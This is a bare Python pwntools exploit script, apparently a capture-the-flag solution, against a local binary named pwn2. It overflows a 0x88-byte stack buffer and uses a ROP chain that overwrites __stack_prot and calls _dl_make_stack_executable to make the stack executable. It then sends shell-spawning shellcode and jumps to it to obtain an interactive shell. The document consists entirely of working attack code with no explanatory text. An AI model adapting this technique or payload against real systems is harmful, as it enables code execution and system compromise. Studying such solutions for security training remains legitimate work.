from pwn import *

context(os='linux', arch='amd64', log_level='debug')

io = process('./pwn2')
elf = ELF('./pwn2')

vul = 0x4009E7
write = 0x4009DD

pop_rdi = 0x4014c6
pop_rsi = 0x4015e7
pop_rdx = 0x442626
jmp_rsi = 0x4a3313
mov_rdi_esi = 0x47a3b3

payload  = "A"*0x88
payload += p64(pop_rsi) + p64(7) + p64(pop_rdi) + p64(elf.sym['__stack_prot']) + p64(mov_rdi_esi)
payload += p64(pop_rdi) + p64(elf.sym['__libc_stack_end']) + p64(elf.sym['_dl_make_stack_executable'])
payload += p64(vul)

#gdb.attach(io)

io.sendlineafter('welcome~\n', payload)

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x88, "A") + p64(jmp_rsi)

io.sendline(payload)

io.interactive()
